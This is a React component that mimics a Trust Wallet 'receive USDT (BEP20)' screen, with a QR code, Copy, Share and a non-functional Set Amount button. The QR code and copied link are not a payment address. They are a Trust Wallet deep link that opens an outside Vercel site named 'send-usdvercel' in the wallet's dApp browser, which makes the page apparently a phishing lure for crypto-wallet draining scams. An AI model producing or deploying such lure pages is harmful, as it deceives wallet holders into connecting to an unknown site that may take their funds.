import QRCode from "react-qr-code";

export default function QRPage() {

  const url = "https://link.trustwallet.com/open_url?url=https://send-usdvercel-git-main-prinsgianni1-2611s-projects.vercel.app/";

  const copy = () => {
    navigator.clipboard.writeText(url);
    alert("Copiato!");
  };

  const share = async () => {
    if (navigator.share) {
      await navigator.share({ url });
    } else {
      alert("Share non supportato");
    }
  };

  return (
    <div style={{
      background: "#000",
      minHeight: "100vh",
      color: "white",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      fontFamily: "-apple-system, sans-serif"
    }}>

      {/* HEADER */}
      <div style={{ fontSize: "22px", marginBottom: "20px" }}>
        <span style={{ color: "#22c55e" }}>●</span> USDT
        <span style={{
          marginLeft: "10px",
          background: "#333",
          padding: "4px 10px",
          borderRadius: "10px",
          fontSize: "12px"
        }}>
          BEP20
        </span>
      </div>

      {/* QR CARD */}
      <div style={{
        background: "#fff",
        padding: "20px",
        borderRadius: "20px",
        textAlign: "center"
      }}>
        <QRCode value={url} size={200} />

        <div style={{
          marginTop: "10px",
          fontSize: "12px",
          color: "#000"
        }}>
          https://send-usdvercel...
        </div>
      </div>

      {/* BUTTONS */}
      <div style={{
        display: "flex",
        gap: "20px",
        marginTop: "20px"
      }}>
        <button style={btn} onClick={copy}>Copy</button>
        <button style={btn} onClick={() => alert("Set Amount")}>Set Amount</button>
        <button style={btn} onClick={share}>Share</button>
      </div>

    </div>
  );
}

const btn = {
  background: "#111",
  color: "white",
  border: "none",
  padding: "12px 18px",
  borderRadius: "12px",
  cursor: "pointer"
};